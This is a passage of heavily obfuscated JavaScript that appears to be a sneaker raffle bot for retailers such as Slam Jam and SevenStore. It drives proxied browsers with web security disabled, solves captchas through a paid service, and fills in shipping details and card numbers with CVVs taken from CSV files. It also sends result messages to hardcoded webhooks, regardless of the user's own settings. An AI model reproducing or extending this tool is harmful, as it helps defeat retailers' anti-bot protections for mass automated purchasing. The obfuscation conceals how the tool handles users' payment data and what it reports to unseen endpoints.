            await _0x43b8df['click']('.product-select-variant-wrapper'), await _0x4e5841(0x320), await _0x43b8df['click']('li.product-select-variant__value[data-size=\x22' + _0x4c6fbc[_0x5d125d]['Size'] + '\x22]'), await _0x4e5841(0x384), await _0x43b8df['$eval']('#AddToCartForm-product-template-raffle', _0x441c4f => _0x441c4f['submit']()), await _0x43b8df['waitForSelector']('.cart-order-summary__content'), await _0x4e5841(0x514), await _0x43b8df['goto']('https://drop.slamjam.com/checkout'), await _0x4e5841(0x514), await _0x43b8df['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x43b8df['select']('#checkout_shipping_address_country', '' + _0x4c6fbc[_0x5d125d]['Country']), await _0x4e5841(0x200), await _0x43b8df['waitForSelector']('#checkout_shipping_address_first_name'), await _0x43b8df['type']('#checkout_shipping_address_first_name', '' + _0x4c6fbc[_0x5d125d]['FirstName']), await _0x4e5841(0x237), await _0x43b8df['type']('#checkout_shipping_address_last_name', '' + _0x4c6fbc[_0x5d125d]['LastName']), await _0x4e5841(0x1e0), await _0x43b8df['type']('#checkout_shipping_address_address1', _0x4c6fbc[_0x5d125d]['Address1'] + '\x20' + _0x4c6fbc[_0x5d125d]['HouseNumber']), await _0x4e5841(0x514), await _0x43b8df['type']('#checkout_shipping_address_address2', '' + _0x4c6fbc[_0x5d125d]['Address2']), await _0x4e5841(0x514);
            _0x4c6fbc[_0x5d125d]['Postcode'] == undefined && (_0x4c6fbc[_0x5d125d]['Postcode'] = _0x4c6fbc[_0x5d125d]['Zip']);
            await _0x43b8df['type']('#checkout_shipping_address_zip', '' + _0x4c6fbc[_0x5d125d]['Postcode']), await _0x4e5841(0x2bc), await _0x43b8df['type']('#checkout_shipping_address_city', '' + _0x4c6fbc[_0x5d125d]['City']), await _0x4e5841(0x320), await _0x43b8df['type']('#checkout_shipping_address_phone', '' + _0x4c6fbc[_0x5d125d]['Phone']), await _0x4e5841(0x320), await _0x43b8df['click']('#continue_button'), await _0x4e5841(0xbb8), await _0x43b8df['waitForSelector']('.summary-title'), await _0x4e5841(0x320), await _0x43b8df['click']('#continue_button'), await _0x4e5841(0x320), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x43b8df['waitForSelector']('#checkout_credit_card_vault'), await _0x4e5841(0x3e8);
            var _0x44b6d4 = await _0x43b8df['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3e96e6 = await _0x44b6d4['contentFrame']();
            await _0x3e96e6['click']('#number'), await _0x4e5841(0x3e8), await _0x3e96e6['type']('#number', '' + _0x4c6fbc[_0x5d125d]['CardNumber'], { 'delay': 0x78 }), _0x44b6d4 = await _0x43b8df['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3e96e6 = await _0x44b6d4['contentFrame'](), await _0x4e5841(0x1c2), await _0x3e96e6['click']('#name'), await _0x4e5841(0x1f4), await _0x3e96e6['type']('#name', '' + _0x4c6fbc[_0x5d125d]['NameOnCard'], { 'delay': 0x78 }), _0x44b6d4 = await _0x43b8df['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3e96e6 = await _0x44b6d4['contentFrame'](), await _0x4e5841(0x1c2), await _0x3e96e6['click']('#expiry'), await _0x4e5841(0x1f4), await _0x3e96e6['type']('#expiry', '' + _0x4c6fbc[_0x5d125d]['ExpiryDate'], { 'delay': 0x78 }), _0x44b6d4 = await _0x43b8df['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3e96e6 = await _0x44b6d4['contentFrame'](), await _0x4e5841(0x1c2), await _0x3e96e6['click']('#verification_value'), await _0x4e5841(0x1f4), await _0x3e96e6['type']('#verification_value', '' + _0x4c6fbc[_0x5d125d]['CVV'], { 'delay': 0x78 }), await _0x43b8df['$eval']('#accepts-flag-raffle', _0x2f6f9f => _0x2f6f9f['click']()), await _0x4e5841(0x7d0), console['log'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Processing\x20Order'), await _0x43b8df['$eval']('#continue_button', _0x5a3803 => _0x5a3803['click']()), await _0x4e5841(0x1b58), await _0x43b8df['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x43b8df['$eval']('.edit_checkout.animate-floating-labels', _0x408523 => _0x408523['submit']()), await _0x4e5841(0x7d0);
            try {
                await _0x43b8df['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x43cd48 = 'no', _0x4fb703(_0x4c6fbc[_0x5d125d], _0x2fc6cc), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x23b3e4) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x23b3e4['message']);
            }
            var _0x338121 = await _0x5b798c(_0x4c6fbc[_0x5d125d], _0x2fc6cc, 'dev', ![]), _0x55532f = await _0x5b798c(_0x4c6fbc[_0x5d125d], _0x2fc6cc, 'pub', ![]);
            const _0x2ccf02 = {
                'succesDEVMSG': { 'embeds': [_0x338121] },
                'succesPUBMSG': { 'embeds': [_0x55532f] }
            };
            try {
                _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x2ccf02['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x2ccf02['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x5ca215, _0x2ccf02['succesPUBMSG']);
            } catch (_0x4cf0ea) {
                console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4cf0ea));
            }
        } catch (_0x3c10ee) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20' + _0x3c10ee)), _0x29fd4b = '' + _0x3c10ee;
            var _0x2ce249 = await _0x5b798c(kickz[_0x5d125d], _0x2fc6cc, 'dev', !![], _0x29fd4b);
            EMBEDS['errorDEV'] = { 'embeds': [_0x2ce249] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], EMBEDS['errorDEV']), await _0x331f59(_0x40d0b0, EMBEDS['errorDEV']), _0x43cd48 = 'yes';
        } finally {
            _0x4b961b && _0x4b961b['close']();
            if (_0x43cd48 == 'yes' && _0x21ab10 != 0x5 && _0x29fd4b != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2fc6cc['name'] + ']\x20Task\x20' + (_0x5d125d + 0x1) + '\x20:\x20Retrying')), _0x5d125d = _0x5d125d - 0x1, _0x21ab10 = _0x21ab10 + 0x1;
                continue;
            }
            _0x43cd48 == 'yes' && _0x21ab10 >= 0x5 && (_0x20b8ba(_0x4c6fbc[_0x5d125d], _0x2fc6cc), _0x43cd48 = 'no', _0x21ab10 = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x175b78(_0x5b6dc0, _0x4885c5, _0x2aca93) {
    var _0x2b6713 = ![], _0x14b8c3 = ![];
    if (_0x4c3205['captchaKey'] == '' || _0x4c3205['captchaKey'] == undefined)
        return console['log'](_0x108b38['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x54d315 = 0x0; _0x54d315 < _0x4885c5['length']; _0x54d315++) {
        if (_0x217f41 != 'yes')
            var _0x217f41 = '', _0x1d71bb = 0x0;
        var _0x366973, _0x11ed29 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x4885c5[_0x54d315]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4885c5[_0x54d315]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }];
        const _0x4f02b4 = { 'embeds': _0x11ed29 };
        _0x4204b1(_0x5b6dc0['name'] + '\x20Task\x20' + (_0x54d315 + 0x1) + '\x20/\x20' + _0x4885c5['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x4885c5, _0x54d315);
        var _0x4d0504 = await _0x5b798c(_0x4885c5[_0x54d315], _0x5b6dc0, 'dev', ![]), _0x1cbc84 = await _0x5b798c(_0x4885c5[_0x54d315], _0x5b6dc0, 'pub', ![]);
        const _0x98b9aa = {
            'succesDEVMSG': { 'embeds': [_0x4d0504] },
            'succesPUBMSG': { 'embeds': [_0x1cbc84] }
        };
        if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
            try {
                await _0x331f59(_0x4c3205['webhook'], _0x98b9aa['succesDEVMSG']);
            } catch {
            }
        await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x98b9aa['succesDEVMSG']), await _0x4e5841(0xc8);
        try {
            await _0x331f59(_0x5ca215, _0x98b9aa['succesPUBMSG']);
        } catch {
        }
        if (_0x4885c5[_0x54d315]['Email'] == '' || _0x4885c5[_0x54d315]['Url'] == '' || _0x4885c5[_0x54d315]['FirstName'] == '' || _0x4885c5[_0x54d315]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x4e0108 = _0x2aca93[_0x54d315]['split'](':');
        else
            var _0x5541c3 = Math['round'](Math['random']() * (_0x2aca93['length'] - 0x1)), _0x4e0108 = _0x2aca93[_0x5541c3]['split'](':');
        const _0x325698 = await _0x4ec495['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4e0108[0x0] + ':' + _0x4e0108[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x372d47 = await _0x325698['newPage']();
            await _0x372d47['authenticate']({
                'username': '' + _0x4e0108[0x2],
                'password': '' + _0x4e0108[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x372d47['setRequestInterception'](!![]), _0x372d47['on']('request', _0x590f35 => {
                _0x590f35['resourceType']() === 'image' || _0x590f35['resourceType']() === 'font' || _0x590f35['resourceType']() === 'media' ? _0x590f35['abort']() : _0x590f35['continue']();
            }), await _0x372d47['goto']('' + _0x4885c5[_0x54d315]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x372d47['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x372d47['type']('#comp_firstname', '' + _0x4885c5[_0x54d315]['FirstName']), await _0x372d47['waitForSelector']('#comp_lastname'), await _0x372d47['type']('#comp_lastname', '' + _0x4885c5[_0x54d315]['LastName']), await _0x372d47['waitForSelector']('#comp_email'), await _0x372d47['type']('#comp_email', '' + _0x4885c5[_0x54d315]['Email']), await _0x372d47['waitForSelector']('#comp_paypalemail'), await _0x372d47['type']('#comp_paypalemail', '' + _0x4885c5[_0x54d315]['Email']), await _0x372d47['waitForSelector']('#comp_mobile_end'), await _0x372d47['type']('#comp_mobile_end', '' + _0x4885c5[_0x54d315]['Phone']), await _0x372d47['waitForSelector']('#comp_dob'), await _0x372d47['type']('#comp_dob', '08/09/1992'), console['log'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x4885c5[_0x54d315]['Size'] == 'RANDOM') {
                const _0xcbee3e = await _0x372d47['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2a30ee => {
                    return _0x2a30ee['map'](_0x3a1946 => _0x3a1946['value']);
                });
                var _0x30c242 = Math['round'](Math['random']() * (_0xcbee3e['length'] - 0x2));
                await _0x372d47['select']('#shoesize', _0xcbee3e[_0x30c242 + 0x1]), await _0x4e5841(0x3e8);
            } else {
                const _0x219c9a = await _0x372d47['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x279347 => {
                    return _0x279347['map'](_0x4e6482 => _0x4e6482['innerText']);
                }), _0xab5b1c = await _0x372d47['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4bbeb9 => {
                    return _0x4bbeb9['map'](_0x150b7f => _0x150b7f['value']);
                });
                var _0x24d7e4 = _0x4885c5[_0x54d315]['Size'];
                for (var _0x3fed0c = 0x1; _0x3fed0c < _0xab5b1c['length']; _0x3fed0c++) {
                    var _0x1695e0 = _0x219c9a[_0x3fed0c]['split']('\x20')[0x0];
                    if (_0x1695e0 == _0x24d7e4) {
                        await _0x372d47['select']('#shoesize', _0xab5b1c[_0x3fed0c]);
                        break;
                    } else {
                        if (_0x3fed0c + 0x1 == _0xab5b1c['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x372d47['waitForSelector']('#comp_address1'), await _0x372d47['type']('#comp_address1', _0x4885c5[_0x54d315]['Address1'] + '\x20' + _0x4885c5[_0x54d315]['HouseNumber']), await _0x372d47['waitForSelector']('#comp_address2'), await _0x372d47['type']('#comp_address2', '' + _0x4885c5[_0x54d315]['Address2']), await _0x372d47['waitForSelector']('#comp_address2'), await _0x372d47['type']('#comp_address3', '' + _0x4885c5[_0x54d315]['City']), await _0x372d47['waitForSelector']('#comp_postcode'), await _0x372d47['type']('#comp_postcode', '' + _0x4885c5[_0x54d315]['Zip']), console['log'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4e5841(0x4b0), await _0x372d47['click']('label#emailhold'), await _0x4e5841(0x5dc), await _0x372d47['click']('#preauth_tandc_email\x20>\x20label'), await _0x4e5841(0x5dc), await _0x372d47['click']('#submit'), await _0x372d47['waitForSelector']('#paymentWrap'), console['log'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20' + _0x108b38['blue']('Awaiting\x20Paypal\x20Payment')), _0x325698['on']('targetcreated', async _0x5f3134 => {
                if (_0x5f3134['type']() === 'page') {
                    const _0x435d26 = await _0x5f3134['page']();
                    async function _0x52be82() {
                        try {
                            await _0x372d47['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x14b8c3 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x473c8c() {
                        try {
                            await _0x372d47['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2b6713 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x473c8c(), _0x52be82(), await _0x4e5841(0x493e0);
                }
            });
            async function _0x3a44ed() {
                for (let _0x281212 = 0x0; _0x281212 < 0x12c; _0x281212++) {
                    if (_0x2b6713 == !![]) {
                        _0x217f41 = 'no', _0x4fb703(_0x4885c5[_0x54d315], _0x5b6dc0), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
                            try {
                                await _0x331f59(_0x4c3205['webhook'], _0x98b9aa['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x98b9aa['succesDEVMSG']), await _0x4e5841(0xc8);
                        try {
                            await _0x331f59(_0x5ca215, _0x98b9aa['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x14b8c3)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x4e5841(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x4e5841(0xbb8), await _0x372d47['click']('.zoid-outlet'), await _0x4e5841(0x7d0), await _0x3a44ed();
        } catch (_0x225cca) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20' + _0x225cca)), _0x366973 = '' + _0x225cca;
            var _0x27508f = await _0x5b798c(_0x4885c5[_0x54d315], _0x5b6dc0, 'dev', !![], _0x366973);
            _0x98b9aa['errorDEV'] = { 'embeds': [_0x27508f] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x98b9aa['errorDEV']), await _0x331f59(_0x40d0b0, _0x98b9aa['errorDEV']);
        } finally {
            _0x325698 && _0x325698['close']();
            if (_0x217f41 == 'yes' && _0x1d71bb != 0x5 && _0x366973 != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x5b6dc0['name'] + ']\x20Task\x20' + (_0x54d315 + 0x1) + '\x20:\x20Retrying')), _0x54d315 = _0x54d315 - 0x1, _0x1d71bb = _0x1d71bb + 0x1;
                continue;
            }
            _0x217f41 == 'yes' && _0x1d71bb >= 0x5 && (_0x20b8ba(afew[_0x54d315], _0x5b6dc0), _0x217f41 = 'no', _0x1d71bb = 0x0), console['log']('Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x4e6ca4(_0x2779fc, _0x5d8d25, _0x6c6300) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2c75c2 = 0x0; _0x2c75c2 < _0x5d8d25['length']; _0x2c75c2++) {
        _0x4204b1(_0x2779fc['name'] + '\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20/\x20' + _0x5d8d25['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        var _0x6f555a = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0x5d8d25[_0x2c75c2]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5d8d25[_0x2c75c2]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4c3205['version']
                }
            ]
        }];
        const _0x1cc07f = { 'embeds': _0x6f555a };
        await _0x3e9f80(_0x5d8d25, _0x2c75c2);
        if (_0x5d8d25[_0x2c75c2]['Email'] == '' || _0x5d8d25[_0x2c75c2]['Password'] == '' || _0x5d8d25[_0x2c75c2]['FirstName'] == '' || _0x5d8d25[_0x2c75c2]['LastName'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x5d8d25[_0x2c75c2]['Password'] == '' || _0x5d8d25[_0x2c75c2]['Password'] == undefined) && (_0x5d8d25[_0x2c75c2]['Password'] = 'ErehsaWonRaj1!');
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x489164 = _0x6c6300[_0x2c75c2]['split'](':');
        else
            var _0x41ace8 = Math['round'](Math['random']() * (_0x6c6300['length'] - 0x1)), _0x489164 = _0x6c6300[_0x41ace8]['split'](':');
        const _0x46d1ac = await _0x4ec495['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x489164[0x0] + ':' + _0x489164[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x34dde6 = await _0x46d1ac['newPage']();
            await _0x34dde6['authenticate']({
                'username': '' + _0x489164[0x2],
                'password': '' + _0x489164[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34dde6['setRequestInterception'](!![]), _0x34dde6['on']('request', _0xff6db1 => {
                _0xff6db1['resourceType']() === 'image' || _0xff6db1['resourceType']() === 'font' || _0xff6db1['resourceType']() === 'media' ? _0xff6db1['abort']() : _0xff6db1['continue']();
            }), await _0x34dde6['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x34dde6['goto']('' + _0x5d8d25[_0x2c75c2]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x34dde6['waitForSelector']('#btnPdpAtb'), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5d8d25[_0x2c75c2]['Size']);
            const _0x93259a = await _0x34dde6['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x5e2daf => {
                return _0x5e2daf['map'](_0x29c6b4 => _0x29c6b4['innerText']);
            }), _0x33dff5 = await _0x34dde6['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x36e882 = ![];
            if (_0x5d8d25[_0x2c75c2]['Size'] == 'RANDOM') {
                var _0x22fc8e = Math['round'](Math['random']() * (_0x33dff5['length'] - 0x1));
                await _0x33dff5[_0x22fc8e]['click']();
            } else
                for (var _0xcdbb1e = 0x0; _0xcdbb1e < _0x93259a['length']; _0xcdbb1e++) {
                    if (_0x93259a[_0xcdbb1e] != _0x5d8d25[_0x2c75c2]['Size'])
                        continue;
                    try {
                        await _0x33dff5[_0xcdbb1e]['click']();
                    } catch {
                        console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x36e882 = !![];
                    }
                }
            if (_0x36e882)
                continue;
            await _0x4e5841(0x578), await _0x34dde6['click']('#btnPdpAtb'), await _0x34dde6['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x4e5841(0x3e8), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x34dde6['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x34dde6['waitForSelector']('#email'), await _0x34dde6['type']('#email', _0x5d8d25[_0x2c75c2]['Email']), await _0x4e5841(0x226), await _0x34dde6['click']('#guest-submit'), await _0x4e5841(0x1b58), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x34dde6['waitForSelector']('#firstname'), await _0x34dde6['type']('#firstname', _0x5d8d25[_0x2c75c2]['FirstName'], 0x1f4), await _0x4e5841(0x190), await _0x34dde6['waitForSelector']('#surname'), await _0x34dde6['type']('#surname', _0x5d8d25[_0x2c75c2]['LastName'], 0x1f4), await _0x4e5841(0x190), await _0x34dde6['waitForSelector']('#mobile'), await _0x34dde6['type']('#mobile', _0x5d8d25[_0x2c75c2]['Phone'], 0x1f4), await _0x4e5841(0x190), await _0x34dde6['click']('#enterManualDiv'), await _0x4e5841(0x5dc), await _0x34dde6['waitForSelector']('#address1'), await _0x34dde6['type']('#address1', _0x5d8d25[_0x2c75c2]['Address1'] + '\x20' + _0x5d8d25[_0x2c75c2]['HouseNumber'], 0x226), await _0x4e5841(0x384), await _0x34dde6['waitForSelector']('#address2'), await _0x34dde6['type']('#address2', '' + _0x5d8d25[_0x2c75c2]['Address2'], 0x226), await _0x4e5841(0x320);
            const _0x484a7d = await _0x34dde6['$$eval']('#countryselect_view3\x20>\x20option', _0x39533d => {
                return _0x39533d['map'](_0x3258c8 => _0x3258c8['value']);
            });
            var _0x39fbf0;
            for (var _0x4292ff = 0x0; _0x4292ff < _0x484a7d['length']; _0x4292ff++) {
                if (_0x484a7d[_0x4292ff]['startsWith']('' + _0x5d8d25[_0x2c75c2]['Country'])) {
                    _0x39fbf0 = _0x484a7d[_0x4292ff];
                    break;
                }
                continue;
            }
            await _0x34dde6['select']('#countryselect_view3', '' + _0x39fbf0), await _0x34dde6['waitForSelector']('#address4'), await _0x34dde6['type']('#address4', '' + _0x5d8d25[_0x2c75c2]['City'], 0x1f4), await _0x4e5841(0x384), await _0x34dde6['waitForSelector']('#postcode'), await _0x34dde6['type']('#postcode', '' + _0x5d8d25[_0x2c75c2]['Zip'], 0x1f4), await _0x4e5841(0x4b0);
            const _0x586be5 = await _0x34dde6['url']();
            console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0xd7638e = _0x586be5['split']('?')[0x1], _0x5d52ed = await _0x34dde6['$']('#co_address_submit');
            await _0x5d52ed['evaluate'](_0x2ed397 => _0x2ed397['click']()), await _0x4e5841(0x1388), await _0x34dde6['goto']('https://www.sevenstore.com/checkout/pay/?' + _0xd7638e), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x34dde6['waitForSelector']('#paymentbuttons'), await _0x4e5841(0x1388), await _0x34dde6['click']('#paymentbuttons\x20>\x20div'), await _0x4e5841(0x1c2), await _0x34dde6['waitForSelector']('#card-number'), await _0x34dde6['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x5aff93 = await _0x34dde6['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x40dcc2 = await _0x5aff93['contentFrame']();
            await _0x40dcc2['waitForSelector']('.InputContainer'), await _0x40dcc2['click']('.InputContainer\x20>\x20input'), await _0x4e5841(0x578), await _0x34dde6['type']('#card-number', '' + _0x5d8d25[_0x2c75c2]['CreditNumber']), await _0x4e5841(0xfa), await _0x34dde6['type']('#card-expiry', '' + _0x5d8d25[_0x2c75c2]['ExpiryDate']), await _0x4e5841(0xfa), await _0x34dde6['type']('#card-cvc', '' + _0x5d8d25[_0x2c75c2]['CVV']), await _0x4e5841(0x7d0), await _0x34dde6['click']('#card-button'), console['log'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x34dde6['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x331f59(_0x45c891, _0x1cc07f);
            } catch {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x203DS\x20Failed')), _0x6f555a[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x6f555a[0x0]['description'] = '3DS\x20Failed', await _0x331f59(_0x40d0b0, _0x1cc07f);
            }
        } catch (_0x457cd0) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x2779fc['name'] + ']\x20Task\x20' + (_0x2c75c2 + 0x1) + '\x20:\x20' + _0x457cd0)), _0x6f555a[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x6f555a[0x0]['description'] = '' + _0x457cd0, await _0x331f59(_0x40d0b0, _0x1cc07f);
        } finally {
            _0x46d1ac && _0x46d1ac['close']();
            if (_0x2c75c2 + 0x1 == _0x5d8d25['length']) {
                console['log'](_0x108b38['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4e5841(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x4c3205['AfewDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['AfewDelay']);
        }
    }
}
async function _0x680e5f(_0x259d3a, _0x54a67c, _0x32b842, _0x581052, _0x423490) {
    var _0x194146, _0x2ffdf6 = {}, _0x4fec48 = [], _0x49be6f = {}, _0x3969b3 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x581052 && (_0x581052 = {});
    if (_0x54a67c != 'ver') {
